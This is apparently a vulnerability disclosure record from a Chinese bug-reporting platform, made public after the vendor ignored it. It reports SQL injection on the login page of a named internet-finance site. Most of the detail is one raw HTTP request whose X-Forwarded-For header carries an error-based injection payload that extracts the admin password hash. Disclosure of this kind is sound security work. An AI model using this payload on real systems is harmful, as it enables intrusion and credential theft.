wybug_title: 兆鑫财富(互联网金融)主站存在SQL注入漏洞+GETSHELL
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-08-05：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-09-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 兆鑫财富(互联网金融)主站存在SQL注入漏洞+影响3百万交易金额 详细说明：  
POST http://www.zhaoxincfu.com/index.php?user&q=login HTTP/1.1Host: www.zhaoxincfu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.zhaoxincfu.com/?user&q=loginCookie: PHPSESSID=nsea5tv953e0is7hik0lcum6f5; CNZZDATA1255665959=709819914-1438757888-http%253A%252F%252Fwww.wangdaizhijia.com%252F%7C1438757888; dy_cookie_time=604800X-Forwarded-For: 8.8.8.8' and GeometryCollection((select*from(select*from(SELECT group_concat(hex(password)) FROM deayou_users_admin where user_id=1)f)x)) and '1'='1Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 58keywords=123123&password=123123&remember=on&url=%2F%3Fuser




系统邮箱信息
